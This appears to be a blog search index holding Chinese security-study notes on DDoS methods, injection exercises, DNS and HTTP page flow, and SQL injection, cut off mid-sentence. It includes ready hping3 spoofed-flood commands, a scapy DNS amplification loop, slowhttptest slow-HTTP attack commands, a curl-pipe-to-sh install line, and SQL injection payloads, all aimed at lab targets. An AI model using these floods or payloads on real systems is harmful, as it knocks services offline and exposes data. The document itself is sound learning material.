<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[关于ddos]]></title>
    <url>%2F2019%2F10%2F04%2F%E5%85%B3%E4%BA%8Eddos%2F</url>
    <content type="text"><![CDATA[DDOS分类？资源消耗类型连接类主要表现为常用的连接耗尽，包括并发连接，新建连接，慢速连接，空连接等； 数据库查询主要表现为账号验证，表项查询，数据提交等； 网络：带宽 防火墙：吞吐量，并发连接 服务器：CPU.内存，I/O 应用：处理请求能力，对操作系统的使用权 带宽上限，设备性能上限，协议性能上限，应用性能上限，系统性能上限 利用漏洞崩溃系统 崩溃程序 网络流量型：利用网络通讯协议 SYN Flood ACK Flood ICMP Flood UDP Flood DNS Flood HTTP Flood 应用层 Http Flood DNS Flood Https Flood等 协议层 SYN Flood、ICMP Flood Tcp Flood、Udp Flood等 网络层 Arp攻击 hping详细参数解析： -h –help 显示帮助信息 -v –version 显示Hping的版本信息 -c –count 指定数据包的次数 -i –interval 指定发包间隔为多少毫秒，如-i m10：表示发包间隔为毫秒 –flood 尽最快发送数据包，不显示回复 指定所用的模式： 默认模式 TCP模式 -0 –rawip RAW IP 模式 -1 –icmp ICMP 模式 -2 –udp UDP 模式 -8 –scan 扫描模式. 例: hping –scan 1-30,70-90 -S www.target.host -9 –listen 监听模式 IP选项： -a –spoof 源地址欺骗 –rand-dest 随机目的地址模式 –rand-source 随机源地址模式 -t –ttl ttl值，默认为64 -N –id 指定id，默认是随机的 -W –winid 使用win*的id 字节顺序 -r –rel 相对的id区域 -f –frag 将数据包分片后传输（可以通过薄弱的acl（访问控制 列表）） -x –morefrag 设置更多的分片标记 -y –dontfrag 设置不加分片标记 -g –fragoff 设置分片偏移 -m –mtu 设置虚拟MTU, 当数据包&gt;MTU时要使用–frag 进行分片 -o –tos 指定服务类型，默认是0x00,，可以使用–tos help查看帮助 -G –rroute 包含RECORD_ROUTE选项并且显示路由缓存 –lsrr 释放源路记录 –ssrr 严格的源路由记录 -H –ipproto 设置协议范围，仅在RAW IP模式下使用 ICMP选项 -C –icmptype 指定icmp类型（默认类型为回显请求） -K –icmpcode 指定icmp编码（默认为0） –force-icmp 发送所有ICMP数据包类型（默认只发送可以支持的类型） –icmp-gw 针对ICMP数据包重定向设定网关地址（默认是0.0.0.0） –icmp-ts 相当于–icmp –icmptype 13（ICMP时间戳） –icmp-addr 相当于–icmp –icmptype 17（ICMP地址掩码） –icmp-help 显示ICMP的其它帮助选项 UDP/TCP选项 -s –baseport 基本源端口（默认是随机的） -p –destport 目的端口（默认为0），可同时指定多个端口 -k –keep 仍然保持源端口 -w –win 指定数据包大小，默认为64 -O –tcpoff 设置假的TCP数据偏移 -Q –seqnum 仅显示TCP序列号 -b –badcksum 尝试发送不正确IP校验和的数据包 许多系统在发送数据包时使用固定的IP校验和，因此你会得到不正确的UDP/TCP校验和. -M –setseq 设置TCP序列号 -L –setack 使用TCP的ACK（访问控制列表） -F –fin 使用FIN标记set FIN flag -S –syn 使用SNY标记 -R –rst 使用RST标记 -P –push 使用PUSH标记 -A –ack 使用 ACK 标记 -U –urg 使用URG标记 -X –xmas 使用 X 未用标记 (0x40) -Y –ymas 使用 Y 未用标记 (0x80) –tcpexitcode 最后使用 tcp-&gt;th_flags 作为退出代码 –tcp-timestamp 启动TCP时间戳选项来猜测运行时间 常规选项 -d –data 数据大小，默认为0 -E –file 从指定文件中读取数据 -e –sign 增加签名 -j –dump 以十六进行形式转存数据包 -J –print 转存可输出的字符 -B –safe 启用安全协议 -u –end 当通过- -file指定的文件结束时停止并显示，防止文件再从头开始 -T –traceroute 路由跟踪模式 –tr-stop 在路由跟踪模式下当收到第一个非ICMP数据包时退出 –tr-keep-ttl 保持源TTL，对监测一个hop有用 –tr-no-rtt 使用路由跟踪模式时不计算或显示RTT信息 ARS 数据包描述（新增加的内容，暂时还不稳定） –apd-send 发送用描述APD的数据包 TCP的正常连接建立和关闭 TCP报文段格式 TCP三次握手三次握手(Three-way Handshake)，是指建立一个TCP连接时，需要客户端和服务器总共发送3个包。 三次握手的目的是连接服务器指定端口，建立TCP连接,并同步连接双方的序列号和确认号并交换 TCP 窗口大小信息.在socket编程中，客户端执行connect()时。将触发三次握手。 第一次握手: 客户端发送一个TCP的SYN标志位置1的包指明客户打算连接的服务器的端口，以及初始序号X,保存在包头的序列号(Sequence Number)字段里 第二次握手: 服务器发回确认包(ACK)应答。即SYN标志位和ACK标志位均为1同时，将确认序号(Acknowledgement Number)设置为客户的ISN(初始序列号)加1以.即X+1。 第三次握手.客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK的序号字段+1,放在确定字段中发送给对方.并且在数据段放写ISN的+1 TCP四次挥手 DDoS测试SYN Flood原理：攻击者通过发送大量伪造的带有SYN标志位的TCP报文，与目标主机建立了很多虚假的半开连接，在服务器返回SYN+ACK数据包后，攻击者不对其做出响应，也就是不返回ACK数据包给服务器，这样服务器就会一直等待直到超时。 在三次握手过程中，服务器发送SYN-ACK之后，收到客户端的ACK之前的TCP连接称为半连接(half-open connect).此时服务器处于Syn_RECV状态.当收到ACK后，服务器转入ESTABLISHED状态. 现象：使目标服务器连接资源耗尽、链路堵塞，从而达到拒绝服务的目的。 由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。 测试命令：hping3 -c 1000 -d 120 -S -p 80 –flood –rand-source 192.168.1.116 -c –count 指定数据包的次数 -d –data 数据大小，默认为0 -S –syn 使用SNY标记 -p –destport 目的端口（默认为0），可同时指定多个端口 统计分析： windows：netstat –an | find “SYN_RECEIVED” linux：netstat -n | awk ‘/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}’ Win7如何开启/关闭TCP/IP半开连接数限制 ACK Flood原理：第一种：攻击者伪造大量的SYN+ACK包发送给目标主机，目标主机每收到一个SYN+ACK数据包时，都会去自己的TCP连接表中查看有没有与ACK的发送者建立连接，如果有则发送ACK包完成TCP连接，如果没有则发送ACK+RST 断开连接。但是在查询过程中会消耗一定的CUP计算资源。 第二种： 利用TCP三次握手的ACK+SYN应答，攻击者向不同的服务器发送大量的SYN请求，这些SYN请求数据包的源IP均为受害主机IP 现象：针对第一种方式：如果瞬间收到大量的SYN+ACK数据包，将会消耗服务器的大量cpu资源，导致正常的连接无法建立或增加延迟，甚至造成服务器瘫痪、死机。 针对第二种方式：会有大量的SYN+ACK应答数据包发往受害主机，从而占用目标的网络带宽资源，形成拒绝服务。 测试命令：hping3 –ack -S –flood 192.168.1.116 -s 6666 固定源端口 默认是随机的 ICMP Flood原理：ICMP Flood 的攻击原理和ACK Flood原理类似，属于流量型的攻击方式，由于目前很多防火墙直接过滤ICMP报文， 因此ICMP Flood出现的频度较低。 现象：给服务器带来较大的负载，影响服务器的正常。 测试命令：hping3 -d 200 –icmp –flood -a 1.1.1.1 192.168.1.116 -d –data 数据大小，默认为0 -a 指定源IP UDP Flood原理：UDP（User Datagram Protocol，用户数据报协议），是一种无连接和无状态的网络协议，UDP不需要像TCP那样进行三次握手，运行开销低，不需要确认数据包是否成功到达目的地。这就造成UDP泛洪攻击不但效率高，而且还可以在资源相对较少的情况下执行。UDP大量小数据包会增大网络设备处理数据包的压力；FLOOD可以使用小数据包(64字节)进行攻击,也可以使用大数据包(大于1500字节,以太网MTU为1500字节)进行攻击。 现象：对于大数据包，网络设备需要进行分片、重组，最终达到的效果就是占用网络传输接口的带宽、网络堵塞、服务器响应慢等等。 测试命令：hping3 –udp -p 53 –flood 192.168.1.116 DNS Flood 反射攻击原理： 利用协议特性实现放大效果的流量，查询流量小，相应流量非常巨大 攻击者向僵尸网络发出指令，使僵尸网络中的每一台主机均发出一个伪造源地址的DNS查询请求包，这些请求包查询类型设置为ANY，因为这种类型会请求所有的记录，这些记录会在返回的响应包中，也就是说这种数据包的大小较其他类型是最大的。 伪造DNS数据包，向DNS服务器发送域名查询报文了，而DNS服务器返回的应答报文则会发送给被攻击主机。放大体现在请求DNS回复的类型为ANY，攻击者向服务器请求的包长度为69个字节，而服务器向被攻击主机回复的ANY类型DNS包长度为535字节，大约放大了7倍。 DNS 报文格式 测试命令：scapy i = IP (src=”192.168.1.107”,dst=”114.114.114.114”) u = UDP() q = DNSQR(qname=”nsfocus.com”,qtype=255) d =DNS (rd =1, qdcount=1,qd=q) r = (i/u/d) send(r,loop=1) q = DNSQR(qname=”nsfocus.com”,qtype=255) # 255 类型是any d =DNS (rd =1, qdcount=1,qd=q) #rd=1表示执行递归查询 如果迭代查询第一个请求的DNS服务器没有查询到结果，那么第一个请求的服务器会返回另一个DNS服务器IP，让请求主机向这个IP去继续查询，然而攻击者的数据包源地址是伪造的，所以并不会发起第二次查询，因为第一次查询根本就不是它发起的；而递归查询却是在查询到结果之后，才返回给查询请求发起者。 r = (i/u/d) #合并数据包 CC攻击原理：又称作HTTP 泛洪攻击，其原理是攻击者控制肉鸡、僵尸网络或使用代理服务器，不停地向目标的web服务发送大量合法请求 现象：使得正常用户的web请求处理缓慢甚至得不到处理，制造大量的后台数据库查询动作，消耗目标CPU资源，最终导致服务器宕机崩溃。 测试命令： HTTP慢速攻击原理：模拟正常用户向web服务器发送慢速http请求，由于是慢速的，服务器端需要保持连接资源，直到数据传输结束或请求结束才可释放连接。这种攻击可以分为两类：一类是客户端发数据，另一类是客户端读取服务器发来的数据。HTTP慢速攻击对基于线程处理的web服务器影响显著，如apache、dhttpd，而对基于事件处理的web服务器影响不大，如ngix、lighttpd。 现象：当服务器端建立了大量这样的慢速连接，就会导致服务器拒绝服务。 Slowloris攻击方式HTTP协议规定请求头以一个空行结束，所以完整的http请求头结尾是\r\n\r\n。然而使用非正常的\r\n来结尾，就会导致服务端认为我们的请求头还没结束，等待我们继续发送数据直到超时时间。两种请求头区别如下，CRLF（CarriageReturn Line Feed）表示回车换行 Slow post攻击方式在http头部信息，可以使用content-length声明HTTP消息实体的传输长度，服务器端会content-length的值作为HTTPBODY的长度。利用这一特点，攻击者把content-length设置得很大的，然后缓慢发送数据部分，比如一次只发送一个字节，这样服务器端就要一直保持连接，直到客户端传完所有的数据。 Slow read攻击方式攻击者发送一个完整的HTTP数据请求，之后服务器会给出响应，这时攻击者在将自己的TCP窗口大小设置的很小，服务器会根据客户的TCP窗口大小来传送数据。由于客户端的TCP窗口大小很小，服务器只能缓慢的传输数据给客户端。当建立大量的这种连接时，web应用的并发连接池将被耗尽，最终导致拒绝服务。 Apache range header攻击这种攻击方式只针对apache，当客户端传输大文件时会有range字段，表示将大文件分段，分成几个小段进行传输。例如攻击者将一个文件按照一个字节一段，分成好多段，这样就会造成传输数据缓慢，长时间占用连接，消耗服务器CPU和内存资源。 测试命令：安装slowhttptest Slowloris攻击命令：slowhttptest -c 50 -H -g -o my_header_stats -i 10 -r 200 -t GET -u slowhttptest -c 50 -H -g -o my_header_stats -i 10 -r 200 -t GET -u http://192.168.1.116/dvwa/login.php -c number of connections 测试时建立的连接数-H SlowLoris模式-g 在测试完成后，以时间戳为名生成一个CVS和HTML文件的统计数据-o file name 使用-g参数时，可以使用此参数指定输出文件名-i seconds 在slowrois和Slow POST模式中，指定发送数据间的间隔。-r connections per second 每秒连接个数-t HTTP verb 在请求时使用什么操作，默认GET netstat -pantu | grep ESTABLISHED 正常 异常，0d表示\r,0a表示\n，也就是说结尾是\r\n。 Slow post攻击命令slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.1.116/dvwa/login.php Slow read攻击命令slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://192.168.1.116/dvwa/login.php Apache range header攻击命令slowhttptest -R -u http://192.168.1.116/dvwa/login.php -t HEAD -c 1000 -a 10 -b 3000 -r 500 #### 参考资料：https://www.cnblogs.com/zmlctt/p/3690998.html https://xz.aliyun.com/t/71#toc-11 https://blog.csdn.net/Fly_hps/article/details/80941148]]></content>
  </entry>
  <entry>
    <title><![CDATA[各种注入类型的环境搭建和代码编写]]></title>
    <url>%2F2019%2F10%2F03%2F%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99%2F</url>
    <content type="text"><![CDATA[1、编写常规回显注入的代码，在之前的搭建的环境中测试是否正常2、编写报错注入的代码，并做相应的服务器配置来满足条件，并测试代码是否正常3、编写盲注的代码，在之前的搭建的环境中测试是否正常4、编写宽子节注入的代码，并做相应的服务器配置来满足条件，并测试代码是否正常 扩展学习：可以整理一个网络上公开的各种注入场景，挑一些典型的场景进行实现，比如登录，搜索，留言等，还有一些非常规的：header中的字段被记录导致的注入等]]></content>
  </entry>
  <entry>
    <title><![CDATA[WEB页面解析流程]]></title>
    <url>%2F2019%2F09%2F19%2FWEB%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[[TOC] 1、理解域名解析的整个过程DNS是什么？DNS( Domain Name System)是“域名系统”的英文缩写,用于TCP/IP网络，它所提供的服务是用来将主机名和域名转换为IP地址的工作。 网络通讯大部分是基于TCP/IP的，而TCP/IP是基于IP地址的，所以计算机在网络上进行通讯时只能识别如“202.96.134.133”之类的IP地址，而不能认识域名。我们无法记住10个以上IP地址的网站，所以我们访问网站时，更多的是在浏览器地址栏中输入域名，就能看到所需要的页面，这是因为有一个叫“DNS服务器”的计算机自动把我们的域名“翻译”成了相应的IP地址，然后调出IP地址所对应的网页。 工作流程： 1、在浏览器中输入www . qq .com 域名，操作系统会先检查自己本地的hosts文件是否有这个网址映射关系，如果有，就先调用这个IP地址映射，完成域名解析。 2、如果hosts里没有这个域名的映射，则查找本地DNS解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析。 3、如果hosts与本地DNS解析器缓存都没有相应的网址映射关系，首先会找TCP/ip参数中设置的首选DNS服务器，在此我们叫它本地DNS服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。 4、如果要查询的域名，不由本地DNS服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个IP地址映射，完成域名解析，此解析不具有权威性。 5、如果本地DNS服务器本地区域文件与缓存解析都失效，则根据本地DNS服务器的设置（是否设置转发器）进行查询， （1）如果未用转发模式，本地DNS就把请求发至13台根DNS，根DNS服务器收到请求后会判断这个域名(.com)是谁来授权管理，并会返回一个负责该顶级域名服务器的一个IP。本地DNS服务器收到IP信息后，将会联系负责.com域的这台服务器。这台负责.com域的服务器收到请求后，如果自己无法解析，它就会找一个管理.com域的下一级DNS服务器地址(http://qq.com)给本地DNS服务器。当本地DNS服务器收到这个地址后，就会找http://qq.com域服务器，重复上面的动作，进行查询，直至找到www . qq .com主机。 （2）如果用的是转发模式，此DNS服务器就会把请求转发至上一级DNS服务器，由上一级服务器进行解析，上一级服务器如果不能解析，或找根DNS或把转请求转至上上级，以此循环。不管是本地DNS服务器用是是转发，还是根提示，最后都是把结果返回给本地DNS服务器，由此DNS服务器再返回给客户机。 ​ 从客户端到本地DNS服务器是属于递归查询，而DNS服务器之间就是的交互查询就是迭代查询。 DNS 域名称的五个类别 一些常见的DNS域名称 DNS记录 A记录 IP地址记录,记录一个域名对应的IP地址AAAA记录 IPv6 地址记录，记录一个域名对应的IPv6地址CNAME记录 别名记录，记录一个主机的别名MX记录 电子邮件交换记录，记录一个邮件域名对应的IP地址NS记录 域名服务器记录 ,记录该域名由哪台域名服务器解析PTR记录 反向记录，也即从IP地址到域名的一条记录TXT记录 记录域名的相关文本信息 第一行Server是： DNS服务器的主机名 –114.114.114.114 第二行Address是： 服务器的ip地址 –114.114.114.114#53 非权威应答（Non-authoritative answer）： Name是：解析的URL –www.zsc0810.site Address是：47.105.32.145 DNS域传送漏洞：什么是DNS域传送？ DNS 服务器分为： 主服务器、备份服务器和缓存服务器。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。 在主备服务器之间同步数据库，需要使用 “DNS 域传送 ” 。 危险：若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。 （1）一键安装Dockercurl -s https://get.docker.com/ | sh 如果是使用一键安装工具安装的docker，则docker会自动启动。 （2）安装Docker Composecurl -L https://github.com/docker/compose/releases/download/1.7.0/docker-compose-`uname -s -uname -m` &gt; /usr/local/bin/docker-compose chmod +x /usr/local/bin/docker-compose docker-compose -v （3）下载Vulhub（4）启动环境进入相应路径 cd /path/to/vuln/ 运行 docker-compose up -d 结束 docker-compose down 启动192.168.1.100带有DNS域传送漏洞的DNS服务器 使用nmap扫描DNS域传送泄露漏洞 2 用dig来测试DNS服务器是否存在域传送泄露 3 DNS查询工具nslookup对DNS域传送的测试（在交互式shell中发现一个DNS服务器的域传送漏洞的过程） 操作基本的步骤是: 1) 输入nslookup命令进入交互式shell 2) Server 命令参数设定查询将要使用的DNS服务器 3) Ls命令列出某个域中的所有域名 4) Exit命令退出程序 攻击者能获取的敏感主要包括： 1）网络的拓扑结构，服务器集中的IP地址段 2）数据库服务器的IP地址，例如上述nwpudb2.nwpu.edu.cn 3）测试服务器的IP地址，例如test.nwpu.edu.cn 4）VPN服务器地址泄露 5）其他敏感服务器 2、WEB 页面请求的整个流程（从输入URL到页面加载发生了什么？）总的来说分为以下几个过程： DNS解析 TCP连接 发送HTTP请求 服务器处理请求并返回HTTP报文 浏览器解析渲染页面 连接结束具体过程 具体过程:DNS解析实现了网址到IP地址的转换。网址到IP地址转换的过程是如何进行的? 首先在本地域名服务器中查询IP地址，如果没有找到的情况下，本地域名服务器会向根域名服务器发送一个请求，如果根域名服务器也不存在该域名时，本地域名会向com顶级域名服务器发送一个请求，依次类推下去。直到最后本地域名服务器得到google的IP地址并把它缓存到本地，供下次查询使用。 所有网址真正的解析过程为: . -&gt; .com -&gt; google.com. -&gt; www.google.com.。 DNS优化如何减少该过程的步骤呢？那就是DNS缓存。 DNS存在着多级缓存，从离浏览器的距离排序的话，有以下几种: 浏览器缓存，系统缓存，路由器缓存，IPS服务器缓存，根域名服务器缓存，顶级域名服务器缓存，主域名服务器缓存。 在你的chrome浏览器中输入:chrome://dns/，你可以看到chrome浏览器的DNS缓存。 系统缓存主要存在/etc/hosts(Linux系统)中: 谷歌浏览器缓存 DNS负载均衡DNS可以返回一个合适的机器的IP给用户，例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等，这种过程就是DNS负载均衡，又叫做DNS重定向。CDN(Content Delivery Network)就是利用DNS的重定向技术，DNS服务器会返回一个跟用户最接近的点的IP地址给用户，CDN节点的服务器负责响应用户的请求，提供所需的内容 TCP连接HTTP协议是使用TCP作为其传输层协议的 HTTPS协议的本质就是HTTP + SSL(or TLS)。在HTTP报文进入TCP报文之前，先使用SSL对HTTP报文进行加密。从网络的层级结构看它位于HTTP协议与TCP协议之间。 HTTPS过程HTTPS在传输数据之前需要客户端与服务器进行一个握手(TLS/SSL握手)，在握手过程中将确立双方加密传输数据的密码信息。TLS/SSL使用了非对称加密，对称加密以及hash等。具体过程请参考经典的阮一峰先生的博客TLS/SSL握手过程。HTTPS相比于HTTP，虽然提供了安全保证，但是势必会带来一些时间上的损耗，如握手和加密等过程，是否使用HTTPS需要根据具体情况在安全和性能方面做出权衡。 HTTP请求HTTP请求报文是由三部分组成: 请求行, 请求报头和请求正文。 请求行格式如下： Method Request-URL HTTP-Version CRLF eg: GET index.html HTTP/1.1 常用的方法有: GET, POST, PUT, DELETE, OPTIONS, HEAD。 请求报头请求报头允许客户端向服务器传递请求的附加信息和客户端自身的信息。 PS: 客户端不一定特指浏览器，有时候也可使用Linux下的CURL命令以及HTTP客户端测试工具等。常见的请求报头有: Accept, Accept-Charset, Accept-Encoding, Accept-Language, Content-Type, Authorization, Cookie, User-Agent等。 请求报头中使用了Accept, Accept-Encoding, Accept-Language, Cache-Control, Connection, Cookie等字段。Accept用于指定客户端用于接受哪些类型的信息，Accept-Encoding与Accept类似，它用于指定接受的编码方式。Connection设置为Keep-alive用于告诉客户端本次HTTP请求结束之后并不需要关闭TCP连接，这样可以使下次HTTP请求使用相同的TCP通道，节省TCP连接建立的时间。 请求正文当使用POST, PUT等方法时，通常需要客户端向服务器传递数据。这些数据就储存在请求正文中。在请求包头中有一些与请求正文相关的信息，例如:现在的Web应用通常采用Rest架构，请求的数据格式一般为json。这时就需要设置Content-Type: application/json。 服务器处理请求并返回HTTP报文后端从在固定的端口接收到TCP报文开始，这一部分对应于编程语言中的socket。它会对TCP连接进行处理，对HTTP协议进行解析，并按照报文格式进一步封装成HTTPRequest对象，供上层使用。这一部分工作一般是由Web服务器去进行，我使用过的Web服务器有Tomcat, Jetty和Netty等等。 HTTP响应报文也是由三部分组成: 状态码, 响应报头和响应报文。 状态码状态码是由3位数组成，第一个数字定义了响应的类别，且有五种可能取值: 1xx：指示信息–表示请求已接收，继续处理。 2xx：成功–表示请求已被成功接收、理解、接受。 3xx：重定向–要完成请求必须进行更进一步的操作。 4xx：客户端错误–请求有语法错误或请求无法实现。 5xx：服务器端错误–服务器未能实现合法的请求。平时遇到比较常见的状态码有:200, 204, 301, 302, 304, 400, 401, 403, 404, 422, 500 200：请求已成功。 204：服务器已处理请求，但不返回任何实体内容，并且希望返回更新了的元信息。若客户端是浏览器的话，那么浏览器应保留发送该请求的页面，而不更改任何文档视图。 301：永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替。 302：临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI。 304：如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。 400：客户端请求包含语法错误，服务器无法理解。 401：请求要求用户进行身份认证。 403：服务器理解请求客户端的请求，但是拒绝执行此请求。 404：请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。 422：请求格式正确，但是由于含有语义错误，无法响应。 500：服务器内部错误。 响应报头常见的响应报头字段有: Server, Connection…。 响应报文服务器返回给浏览器的文本信息，通常HTML, CSS, JS, 图片等文件就放在这一部分。 浏览器解析渲染页面浏览器在收到HTML,CSS,JS文件后，它是如何把页面呈现到屏幕上的？下图对应的就是WebKit渲染的过程。 浏览器是一个边解析边渲染的过程。 JS的解析是由浏览器中的JS解析引擎完成的 浏览器在解析过程中，如果遇到请求外部资源时，如图像,iconfont,JS等。浏览器将重复1-6过程下载该资源。请求过程是异步的，并不会影响HTML文档进行加载，但是当文档加载过程中遇到JS文件，HTML文档会挂起渲染过程，不仅要等到文档中JS文件加载完毕还要等待解析执行完毕，才会继续HTML的渲染过程。原因是因为JS有可能修改DOM结构，这就意味着JS执行完成前，后续所有资源的下载是没有必要的，这就是JS阻塞后续资源下载的根本原因。CSS文件的加载不影响JS文件的加载，但是却影响JS文件的执行。JS代码执行前浏览器必须保证CSS文件已经下载并加载完毕。 WEB页面解析流程如图： nginx将HTTP请求处理流程分为11个阶段 NGX_HTTP_POST_READ_PHASE：第一个阶段，ngx_http_realip_module模块会注册handler到该阶段（nginx作为代理服务器时有用，后端以此获取客户端原始IP），而该模块默认不会开启，需要通过–with-http_realip_module启动； NGX_HTTP_SERVER_REWRITE_PHASE：server块中配置了rewrite指令时，该阶段会重写url； NGX_HTTP_FIND_CONFIG_PHASE：查找匹配的location配置；该阶段不能自定义handler； NGX_HTTP_REWRITE_PHASE：location块中配置了rewrite指令时，该阶段会重写url； NGX_HTTP_POST_REWRITE_PHASE：该阶段会检查是否发生了url重写，如果有，重新回到FIND_CONFIG阶段，否则直接进入下一个阶段；该阶段不能自定义handler； NGX_HTTP_PREACCESS_PHASE：访问控制，比如限流模块ngx_http_limit_req_module会注册handler到该阶段； NGX_HTTP_ACCESS_PHASE：访问权限控制，比如基于ip黑白名单的权限控制，基于用户名密码的权限控制等； NGX_HTTP_POST_ACCESS_PHASE：该阶段会根据访问权限控制阶段做相应处理，不能自定义handler； NGX_HTTP_TRY_FILES_PHASE：只有配置了try_files指令，才会有此阶段，不能自定义handler； NGX_HTTP_CONTENT_PHASE：内容产生阶段，返回响应给客户端；ngx_http_fastcgi_module模块就处于该阶段； NGX_HTTP_LOG_PHASE：该阶段会记录日志 参考资料https://www.zhihu.com/question/23042131/answer/66571369 https://www.freebuf.com/articles/web/190947.html http://www.lijiejie.com/dns-zone-transfer-1/ https://vulhub.org/#/docs/ https://segmentfault.com/a/1190000020178836 https://segmentfault.com/a/1190000006879700 https://segmentfault.com/a/1190000019263330 https://segmentfault.com/a/1190000006689767]]></content>
  </entry>
  <entry>
    <title><![CDATA[sql注入的payload]]></title>
    <url>%2F2019%2F09%2F01%2Fsql%E6%B3%A8%E5%85%A5%E7%9A%84payload%2F</url>
    <content type="text"><![CDATA[学习目标：能看懂大部分的sql语句，做到给一个复杂的sql语句能看懂，知道是干什么用的，为什么这么写. 第一部分：获取payload通过sqlmap awvs等工具更新sqlmap ​ 内容太多，先放弃了 用着再查 通过谷歌 第二部分：基础1、注入的分类：基于从服务器接收到的响应▲基于错误的 SQL 注入 在URL加入了一些错误的SQL语句，被执行后返回了异常信息，这些异常信息当中包含了敏感信息 ▲联合查询的类型▲堆查询注入 回显注入：利用注入漏洞可以改变页面返回数据 ▲SQL 盲注•基于布尔 SQL 盲注 通过条件是否成立来判断substr截取第一个字符判断是否大于’a’，成立则页面返回数据 •基于时间的 SQL 盲注通过返回时间的长短判断 获取第一个字符的ascii码，判断是否大于115，不成立延时5秒返回 •基于报错的 SQL 盲注基于如何处理输入的 SQL 查询（数据类型）•基于字符串•数字或整数为基础的基于程度和顺序的注入(哪里发生了影响)★一阶注射★二阶注射一阶注射是指输入的注射语句对 WEB 直接产生了影响， 出现了结果； 二阶注入类似存储型 XSS， 是指输入提交的语句， 无法直接对 WEB 应用程序产生影响， 通过其它的辅助间接的对 WEB 产生危害， 这样的就被称为是二阶注入. 基于注入点的位置上的▲通过用户输入的表单域的注射。▲通过 cookie 注射。▲通过服务器变量注射。 （基于头部信息的注射） 以上就是通常分类，先记录下，通过后面的实验练习加深理解 2、系统函数介绍几个常用函数： version()——MySQL 版本 user()——数据库用户名 database()——数据库名 @@datadir——数据库路径 @@version_compile_os——操作系统版本 3、字符串连接函数 concat(str1,str2,…)——没有分隔符地连接字符串 concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串 group_concat(str1,str2,…)——连接一个组的所有字符串， 并以逗号分隔每一条数据 以上三个函数能一次性查出所有信息 . 4、一般用于尝试的语句 Ps:–+可以用#替换， url 提交过程中 Url 编码后的#为%23 or 1=1–+‘or 1=1–+“or 1=1–+)or 1=1–+‘)or 1=1–+“) or 1=1–+“))or 1=1–+ 一般的代码为：$id=$_GET[‘id’];$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; 此处考虑两个点， 一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ， 一般采用两种思 路， 闭合后面的引号或者注释掉， 注释掉采用–+ 或者 #（%23） 5、union 操作符的介绍UNION 操作符用于合并两个或多个 SELECT 语句的结果集。 请注意， UNION 内部的 SELECT语句必须拥有相同数量的列。 列也必须拥有相似的数据类型。 同时， 每条 SELECT 语句中的列的顺序必须相同。 SQL UNION 语法SELECT column_name(s) FROM table_name1UNIONSELECT column_name(s) FROM table_name2注释： 默认地， UNION 操作符选取不同的值。 如果允许重复的值， 请使用 UNION ALL。 另外， UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。 6 、sql 中的逻辑运算万能密码： 正常 Select * from admin where username=’ admin’ and password=’ admin’ 密码：’ or 1=1# Select * from admin where username=’ admin’ and password=’ ’ or 1=1# where 子 句后有 三 个 条 件 语 句 ==username=’ admin’ andpassword=’ ’ or 1=1，在sql 中and 运算优先级大于or的运算优先级，结果恒为真。 7、 注入流程 数据库存储的数据形式如上图，注入的过程就是先拿到数据库名，再获取当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据 Mysql 有一个系统数据库 information_schema， 存储着所有的数据库的相关信息， 一般的，我们利用该表可以进行一次完整的注入。 以下为一般的流程 ： 猜数据库 ： 猜某库的数据表 ： select table_name from information_schema.tables where table_schema=’dvwa’ 猜某表的所有列 select column_name from information_schema.columns where table_name=’users’ 获取某列的内容 select * from 表名； 第部分：实验演示联合查询的类型 payload：-1’union select 1,group_concat(schema_name),3 from information_schema.schemata –+ 1、group_concat(str1,str2,…)——连接一个组的所有字符串， 并以逗号分隔每一条数据 2、union 联合注入， union 的作用是将两个 sql 语句进行联合， union 前后的两个 sql 语句的选择列数要相同才可以。 Union all 与 union 的区别是增加了去重的功能 3、当 id 的数据在数据库中不存在时， id=-1， 两个 sql 语句进行联合操作时，当前一个语句选择的内容为空，就将后面的语句的内容显示出来，此处前台页面返回了我们构造的 union 的数据 4、此处利用 order by 对前面的数据进行排序， 这里有三列数据， 我们就只能用order by 3,超过 3 就会报错。‘order by 4–+的结果显示结果超出。 盲注盲注：sql 注入过程中， sql 语句执行的选择后， 选择的数据不能回显，不返回数据库当中的信息到前端页面。 盲注可以分为三类： •基于布尔 SQL 盲注•基于时间的 SQL 盲注•基于报错的 SQL 盲注 1： 基于布尔 SQL 盲注-构造逻辑判断 截取字符串相关函数解析 ▲left(database(),1)&gt;’ s’ //left()函数 Explain:database()显示数据库名称， 